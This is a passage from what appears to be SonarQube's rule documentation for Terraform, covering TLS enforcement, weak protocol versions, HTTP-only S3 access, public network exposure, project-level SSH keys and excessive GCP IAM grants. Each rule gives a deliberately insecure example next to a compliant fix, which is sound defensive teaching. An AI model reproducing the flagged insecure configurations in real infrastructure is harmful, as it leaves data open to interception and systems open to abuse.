  name &#61; &#34;sns-unencrypted&#34;
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic" rel="nofollow">aws_sns_topic</a>:</p>
<pre>
resource &#34;aws_sns_topic&#34; &#34;topic&#34; {
  name &#61; &#34;sns-encrypted&#34;
  kms_master_key_id &#61; aws_kms_key.enc_key.key_id
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html" rel="nofollow">AWS Documentation</a> - Encryption at rest </li><li> <a href="https://aws.amazon.com/blogs/compute/encrypting-messages-published-to-amazon-sns-with-aws-kms/" rel="nofollow">Encrypting messages published to
  Amazon SNS with AWS KMS</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6403">
              terraform:S6403
            </a>
          </td>
          <td>
            <details>
              <p>By default, GCP SQL instances offer encryption in transit, with support for TLS, but insecure connections are still accepted. On an unsecured
network, such as a public network, the risk of traffic being intercepted is high. When the data isn’t encrypted, an attacker can intercept it and read
confidential information.</p>
<p>When creating a GCP SQL instance, a public IP address is automatically assigned to it and connections to the SQL instance from public networks can
be authorized.</p>
<p>TLS is automatically used when connecting to SQL instances through:</p>
<ul><li> The <a href="https://cloud.google.com/sql/docs/mysql/connect-admin-proxy" rel="nofollow">Cloud SQL Auth proxy</a>. </li><li> The <a href="https://cloud.google.com/sql/docs/mysql/connect-overview#languages" rel="nofollow">Java Socket Library</a>. </li><li> The built-in mechanisms in the <a href="https://cloud.google.com/appengine/docs" rel="nofollow">App Engine</a> environments. </li></ul>
<h2>Ask Yourself Whether</h2>
<p>Connections are not already automatically encrypted by GCP (eg: SQL Auth proxy) and</p>
<ul><li> Connections to the SQL instance are performed on untrusted networks. </li><li> The data stored in the SQL instance is confidential. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt all connections to the SQL instance, whether using public or private IP addresses. However, since private networks can
be considered trusted, requiring TLS in this situation is usually a lower priority task.</p>
<h2>Sensitive Code Example</h2>
<pre>
resource &#34;google_sql_database_instance&#34; &#34;example&#34; { # Sensitive: tls is not required
  name             &#61; &#34;noncompliant-master-instance&#34;
  database_version &#61; &#34;POSTGRES_11&#34;
  region           &#61; &#34;us-central1&#34;

  settings {
    tier &#61; &#34;db-f1-micro&#34;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
resource &#34;google_sql_database_instance&#34; &#34;example&#34; {
  name             &#61; &#34;compliant-master-instance&#34;
  database_version &#61; &#34;POSTGRES_11&#34;
  region           &#61; &#34;us-central1&#34;

  settings {
    tier &#61; &#34;db-f1-micro&#34;
    ip_configuration {
      require_ssl &#61; true
      ipv4_enabled &#61; true
    }
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://cloud.google.com/sql/docs/mysql/authorize-ssl" rel="nofollow">GCP Documentation</a> - Cloud SQL: Authorizing with SSL/TLS certificates </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S4423">
              terraform:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul><li> SSL versions 1.0, 2.0 and 3.0 </li><li> TLS versions 1.0 and 1.1 </li></ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in AWS API Gateway</h2>
<h3>Code examples</h3>
<p>These code samples illustrate how to fix this issue in both APIGateway and ApiGatewayV2.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource &#34;aws_api_gateway_domain_name&#34; &#34;example&#34; {
  domain_name &#61; &#34;api.example.com&#34;
  security_policy &#61; &#34;TLS_1_0&#34; # Noncompliant
}
</pre>
<p>The ApiGatewayV2 uses a weak TLS version by default:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource &#34;aws_apigatewayv2_domain_name&#34; &#34;example&#34; {
  domain_name &#61; &#34;api.example.com&#34;
  domain_name_configuration {} # Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
resource &#34;aws_api_gateway_domain_name&#34; &#34;example&#34; {
  domain_name &#61; &#34;api.example.com&#34;
  security_policy &#61; &#34;TLS_1_2&#34;
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
resource &#34;aws_apigatewayv2_domain_name&#34; &#34;example&#34; {
  domain_name &#61; &#34;api.example.com&#34;
  domain_name_configuration {
    security_policy &#61; &#34;TLS_1_2&#34;
  }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br /></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6249">
              terraform:S6249
            </a>
          </td>
          <td>
            <details>
              <p>By default, S3 buckets can be accessed through HTTP and HTTPs protocols.</p>
<p>As HTTP is a clear-text protocol, it lacks the encryption of transported data, as well as the capability to build an authenticated connection. It
means that a malicious actor who is able to intercept traffic from the network can read, modify or corrupt the transported content.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive information. </li><li> The infrastructure has to comply with AWS Foundational Security Best Practices standard. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to deny all HTTP requests:</p>
<ul><li> for all objects (<code>*</code>) of the bucket </li><li> for all principals (<code>*</code>) </li><li> for all actions (<code>*</code>) </li></ul>
<h2>Sensitive Code Example</h2>
<p>No secure policy is attached to this bucket:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;mynoncompliantbucket&#34; { # Sensitive
  bucket &#61; &#34;mynoncompliantbucketname&#34;
}
</pre>
<p>A policy is defined but forces only HTTPs communication for some users:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;mynoncompliantbucket&#34; { # Sensitive
  bucket &#61; &#34;mynoncompliantbucketname&#34;
}

resource &#34;aws_s3_bucket_policy&#34; &#34;mynoncompliantbucketpolicy&#34; {
  bucket &#61; &#34;mynoncompliantbucketname&#34;

  policy &#61; jsonencode({
    Version &#61; &#34;2012-10-17&#34;
    Id      &#61; &#34;mynoncompliantbucketpolicy&#34;
    Statement &#61; [
      {
        Sid       &#61; &#34;HTTPSOnly&#34;
        Effect    &#61; &#34;Deny&#34;
        Principal &#61; [
          &#34;arn:aws:iam::123456789123:root&#34;
        ] # secondary location: only one principal is forced to use https
        Action    &#61; &#34;s3:*&#34;
        Resource &#61; [
          aws_s3_bucket.mynoncompliantbucketpolicy.arn,
          &#34;${aws_s3_bucket.mynoncompliantbucketpolicy.arn}/*&#34;,
        ]
        Condition &#61; {
          Bool &#61; {
            &#34;aws:SecureTransport&#34; &#61; &#34;false&#34;
          }
        }
      },
    ]
  })
}
</pre>
<h2>Compliant Solution</h2>
<p>A secure policy that denies all HTTP requests is used:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;mycompliantbucket&#34; {
  bucket &#61; &#34;mycompliantbucketname&#34;
}

resource &#34;aws_s3_bucket_policy&#34; &#34;mycompliantpolicy&#34; {
  bucket &#61; &#34;mycompliantbucketname&#34;

  policy &#61; jsonencode({
    Version &#61; &#34;2012-10-17&#34;
    Id      &#61; &#34;mycompliantpolicy&#34;
    Statement &#61; [
      {
        Sid       &#61; &#34;HTTPSOnly&#34;
        Effect    &#61; &#34;Deny&#34;
        Principal &#61; &#34;*&#34;
        Action    &#61; &#34;s3:*&#34;
        Resource &#61; [
          aws_s3_bucket.mycompliantbucket.arn,
          &#34;${aws_s3_bucket.mycompliantbucket.arn}/*&#34;,
        ]
        Condition &#61; {
          Bool &#61; {
            &#34;aws:SecureTransport&#34; &#61; &#34;false&#34;
          }
        }
      },
    ]
  })
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html#transit" rel="nofollow">AWS documentation</a> - Enforce encryption
  of data in transit </li><li> <a href="https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-standards-fsbp-controls.html#fsbp-s3-5" rel="nofollow">AWS Foundational Security
  Best Practices controls</a> - S3 buckets should require requests to use Secure Socket Layer </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6406">
              terraform:S6406
            </a>
          </td>
          <td>
            <details>
              <p>Excessive granting of GCP IAM permissions can allow attackers to exploit an organization’s cloud resources with malicious intent.</p>
<p>To prevent improper creation or deletion of resources after an account is compromised, proactive measures include both following GCP Security
Insights and ensuring custom roles contain as few privileges as possible.</p>
<p>After gaining a foothold in the target infrastructure, sophisticated attacks typically consist of two major parts.<br /> First, attackers must deploy
new resources to carry out their malicious intent. To guard against this, operations teams must control what unexpectedly appears in the
infrastructure, such as what is:</p>
<ul><li> added </li><li> written down </li><li> updated </li><li> started </li><li> appended </li><li> applied </li><li> accessed. </li></ul>
<p>Once the malicious intent is executed, attackers must avoid detection at all costs.<br /> To counter attackers&#39; attempts to remove their
fingerprints, operations teams must control what unexpectedly disappears from the infrastructure, such as what is:</p>
<ul><li> stopped </li><li> disabled </li><li> canceled </li><li> deleted </li><li> destroyed </li><li> detached </li><li> disconnected </li><li> suspended </li><li> rejected </li><li> removed. </li></ul>
<p>For operations teams to be resilient in this scenario, their organization must apply both:</p>
<ul><li> Detection security: log these actions to better detect malicious actions. </li><li> Preventive security: review and limit granted permissions. </li></ul>
<p>This rule raises an issue when a custom role grants a number of sensitive permissions (read-write or destructive permission) that is greater than a
given parameter.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This custom role will be mostly used for read-only purposes. </li><li> Compliance policies require read-only access. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To reduce the risks associated with this role after a compromise:</p>
<ul><li> Reduce the list of permissions to grant only those that are actually needed. </li><li> Favor read-only over read-write. </li></ul>
<h2>Sensitive Code Example</h2>
<p>This custom role grants more than 5 sensitive permissions:</p>
<pre>
resource &#34;google_project_iam_custom_role&#34; &#34;example&#34; {
  permissions &#61; [ # Sensitive
    &#34;resourcemanager.projects.create&#34;, # Sensitive permission
    &#34;resourcemanager.projects.delete&#34;, # Sensitive permission
    &#34;resourcemanager.projects.get&#34;,
    &#34;resourcemanager.projects.list&#34;,
    &#34;run.services.create&#34;, # Sensitive permission
    &#34;run.services.delete&#34;, # Sensitive permission
    &#34;run.services.get&#34;,
    &#34;run.services.getIamPolicy&#34;,
    &#34;run.services.setIamPolicy&#34;,  # Sensitive permission
    &#34;run.services.list&#34;,
    &#34;run.services.update&#34;,  # Sensitive permission
  ]
}
</pre>
<h2>Compliant Solution</h2>
<p>This custom role grants less than 5 sensitive permissions:</p>
<pre>
resource &#34;google_project_iam_custom_role&#34; &#34;example&#34; {
  permissions &#61; [
    &#34;resourcemanager.projects.get&#34;,
    &#34;resourcemanager.projects.list&#34;,
    &#34;run.services.create&#34;,
    &#34;run.services.delete&#34;,
    &#34;run.services.get&#34;,
    &#34;run.services.getIamPolicy&#34;,
    &#34;run.services.list&#34;,
    &#34;run.services.update&#34;,
  ]
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://cloud.google.com/iam/docs/recommender-overview" rel="nofollow">GCP Docs</a> - Enforce least privilege with role recommendations </li><li> <a href="https://cloud.google.com/iam/docs/manage-policy-insights" rel="nofollow">GCP Docs</a> - Security Insights </li><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Boken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6329">
              terraform:S6329
            </a>
          </td>
          <td>
            <details>
              <p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft
or disruption.</p>
<p>Depending on the component, inbound access from the Internet can be enabled via:</p>
<ul><li> a boolean value that explicitly allows access to the public network. </li><li> the assignment of a public IP address. </li><li> database firewall rules that allow public IP ranges. </li></ul>
<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>
<p>This decision increases the likelihood of attacks on the organization, such as:</p>
<ul><li> data breaches. </li><li> intrusions into the infrastructure to permanently steal from it. </li><li> and various malicious traffic, such as DDoS attacks. </li></ul>
<h2>Ask Yourself Whether</h2>
<p>This cloud resource:</p>
<ul><li> should be publicly accessible to any Internet user. </li><li> requires inbound traffic from the Internet to function properly. </li></ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce
sites.</p>
<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud
components.</p>
<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the
absence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>
<h2>Sensitive Code Example</h2>
<p>For AWS:</p>
<pre>
resource &#34;aws_instance&#34; &#34;example&#34; {
  associate_public_ip_address &#61; true # Sensitive
}
</pre>
<pre>
resource &#34;aws_dms_replication_instance&#34; &#34;example&#34; {
  publicly_accessible &#61; true # Sensitive
}
</pre>
<p>For Azure:</p>
<pre>
resource &#34;azurerm_postgresql_server&#34; &#34;example&#34;  {
  public_network_access_enabled &#61; true # Sensitive
}
</pre>
<pre>
resource &#34;azurerm_postgresql_server&#34; &#34;example&#34;  {
  public_network_access_enabled &#61; true # Sensitive
}
</pre>
<pre>
resource &#34;azurerm_kubernetes_cluster&#34; &#34;production&#34; {
  api_server_authorized_ip_ranges &#61; [&#34;176.0.0.0/4&#34;] # Sensitive
  default_node_pool {
    enable_node_public_ip &#61; true # Sensitive
  }
}
</pre>
<p>For GCP:</p>
<pre>
resource &#34;google_compute_instance&#34; &#34;example&#34; {
  network_interface {
    network &#61; &#34;default&#34;

    access_config {  # Sensitive
      # Ephemeral public IP
    }
  }
</pre>
<h2>Compliant Solution</h2>
<p>For AWS:</p>
<pre>
resource &#34;aws_instance&#34; &#34;example&#34; {
  associate_public_ip_address &#61; false
}
</pre>
<pre>
resource &#34;aws_dms_replication_instance&#34; &#34;example&#34; {
  publicly_accessible          &#61; false
}
</pre>
<p>For Azure:</p>
<pre>
resource &#34;azurerm_postgresql_server&#34; &#34;example&#34;  {
  public_network_access_enabled &#61; false
}
</pre>
<pre>
resource &#34;azurerm_kubernetes_cluster&#34; &#34;production&#34; {
  api_server_authorized_ip_ranges &#61; [&#34;192.168.0.0/16&#34;]
  default_node_pool {
    enable_node_public_ip &#61; false
  }
}
</pre>
<p>For GCP:</p>
<pre>
resource &#34;google_compute_instance&#34; &#34;example&#34; {
  network_interface {
    network &#61; google_compute_network.vpc_network_example.name
  }
}
</pre>
<p>Note that setting <code>network&#61;&#34;default&#34;</code> in the network interface block leads to other security problems such as removal of logging, Cloud
VPN/VPC network peering, and the addition of insecure firewall rules.<br /> A safer alternative includes creating a specific VPC or subnetwork and
enforce security measures.</p>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html" rel="nofollow">AWS Documentation</a> - Amazon EC2 instance IP
  addressing </li><li> <a href="https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html" rel="nofollow">AWS Documentation</a> - Public and
  private replication instances </li><li> <a href="https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html" rel="nofollow">AWS Documentation</a> - VPC Peering </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6405">
              terraform:S6405
            </a>
          </td>
          <td>
            <details>
              <p>SSH keys stored and managed in a project’s metadata can be used to access GCP VM instances. By default, GCP automatically deploys project-level SSH
keys to VM instances.</p>
<p>Project-level SSH keys can lead to unauthorized access because:</p>
<ul><li> Their use prevents fine-grained VM-level access control and makes it difficult to follow <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" rel="nofollow">the principle of least privilege</a>. </li><li> Unlike managed access control with <a href="https://cloud.google.com/compute/docs/instances/managing-instance-access" rel="nofollow">OS Login</a>, manual
  cryptographic key management is error-prone and requires careful attention. For example, if a user leaves a project, their SSH keys should be
  removed from the metadata to prevent unwanted access. </li><li> If a project-level SSH key is compromised, all VM instances may be compromised. </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> VM instances in a project have different security requirements. </li><li> Many users with different profiles need access to the VM instances in that project. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Block project-level SSH keys by setting the <code>metadata.block-project-ssh-keys</code> argument to <code>true</code> </li><li> Use <a href="https://cloud.google.com/compute/docs/instances/access-overview?_ga&#61;2.125788746.-190863609.1642494607#oslogin" rel="nofollow">OSLogin</a> to
  benefit from managed access control. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
resource &#34;google_compute_instance&#34; &#34;example&#34; { # Sensitive, because metadata.block-project-ssh-keys is not set to true
  name         &#61; &#34;example&#34;
  machine_type &#61; &#34;e2-micro&#34;
  zone         &#61; &#34;us-central1-a&#34;

  network_interface {
    network &#61; &#34;default&#34;

    access_config {
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
resource &#34;google_compute_instance&#34; &#34;example&#34; {
  name         &#61; &#34;example&#34;
  machine_type &#61; &#34;e2-micro&#34;
  zone         &#61; &#34;us-central1-a&#34;

  metadata &#61; {
    block-project-ssh-keys &#61; true
  }

  network_interface {
    network &#61; &#34;default&#34;

    access_config {
    }
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication.html" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken
  Authentication </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://cwe.mitre.org/data/definitions/269" rel="nofollow">MITRE, CWE-269</a> - Improper Privilege Management </li><li> <a href="https://cwe.mitre.org/data/definitions/272" rel="nofollow">MITRE, CWE-272</a> - Least Privilege Violation </li><li> <a href="https://cloud.google.com/compute/docs/connect/restrict-ssh-keys#remove-metadata-key" rel="nofollow">GCP Documentation</a> - Restrict SSH keys from
  VMs </li><li> <a href="https://cloud.google.com/compute/docs/instances/access-overview#risks" rel="nofollow">GCP Documentation</a> - Risks of manual key management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6400">
              terraform:S6400
            </a>
          </td>
          <td>
            <details>
              <p>Granting highly privileged resource rights to users or groups can reduce an organization’s ability to protect against account or service theft. It
prevents proper segregation of duties and creates potentially critical attack vectors on affected resources.</p>
<p>If elevated access rights are abused or compromised, both the data that the affected resources work with and their access tracking are at risk.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This GCP resource is essential to the information system infrastructure. </li><li> This GCP resource is essential to mission-critical functions. </li><li> Compliance policies require that administrative privileges for this resource be limited to a small group of individuals. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Grant IAM policies or members a less permissive role: In most cases, granting them read-only privileges is sufficient.</p>
<p>Separate tasks by creating multiple roles that do not use a full access role for day-to-day work.</p>
<p>If the predefined GCP roles do not include the specific permissions you need, create <a href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam_custom_role" rel="nofollow">custom IAM roles</a>.</p>
<h2>Sensitive Code Example</h2>
<p>For an IAM policy setup:</p>
<pre>
data &#34;google_iam_policy&#34; &#34;admin&#34; {
  binding {
    role &#61; &#34;roles/run.admin&#34; # Sensitive
    members &#61; [
      &#34;user:name&#64;example.com&#34;,
    ]
  }
}

resource &#34;google_cloud_run_service_iam_policy&#34; &#34;policy&#34; {
  location &#61; google_cloud_run_service.default.location
  project &#61; google_cloud_run_service.default.project
  service &#61; google_cloud_run_service.default.name
  policy_data &#61; data.google_iam_policy.admin.policy_data
}
</pre>
<p>For an IAM policy binding:</p>
<pre>
resource &#34;google_cloud_run_service_iam_binding&#34; &#34;example&#34; {
  location &#61; google_cloud_run_service.default.location
  project &#61; google_cloud_run_service.default.project
  service &#61; google_cloud_run_service.default.name
  role &#61; &#34;roles/run.admin&#34; # Sensitive
  members &#61; [
    &#34;user:name&#64;example.com&#34;,
  ]
}
</pre>
<p>For adding a member to a policy:</p>
<pre>
resource &#34;google_cloud_run_service_iam_member&#34; &#34;example&#34; {
  location &#61; google_cloud_run_service.default.location
  project &#61; google_cloud_run_service.default.project
  service &#61; google_cloud_run_service.default.name
  role &#61; &#34;roles/run.admin&#34; # Sensitive
  member &#61; &#34;user:name&#64;example.com&#34;
}
</pre>
<h2>Compliant Solution</h2>
<p>For an IAM policy setup:</p>
<pre>
data &#34;google_iam_policy&#34; &#34;admin&#34; {
  binding {
    role &#61; &#34;roles/viewer&#34;
    members &#61; [
      &#34;user:name&#64;example.com&#34;,
    ]
  }
}

resource &#34;google_cloud_run_service_iam_policy&#34; &#34;example&#34; {
  location &#61; google_cloud_run_service.default.location
  project &#61; google_cloud_run_service.default.project
  service &#61; google_cloud_run_service.default.name
  policy_data &#61; data.google_iam_policy.admin.policy_data
}
</pre>
<p>For an IAM policy binding:</p>
<pre>
resource &#34;google_cloud_run_service_iam_binding&#34; &#34;example&#34; {
  location &#61; google_cloud_run_service.default.location
  project &#61; google_cloud_run_service.default.project
  service &#61; google_cloud_run_service.default.name
  role &#61; &#34;roles/viewer&#34;
  members &#61; [
    &#34;user:name&#64;example.com&#34;,
  ]
}
</pre>
<p>For adding a member to a policy:</p>
<pre>
resource &#34;google_cloud_run_service_iam_member&#34; &#34;example&#34; {
  location &#61; google_cloud_run_service.default.location
  project &#61; google_cloud_run_service.default.project
  service &#61; google_cloud_run_service.default.name
  role &#61; &#34;roles/viewer&#34;
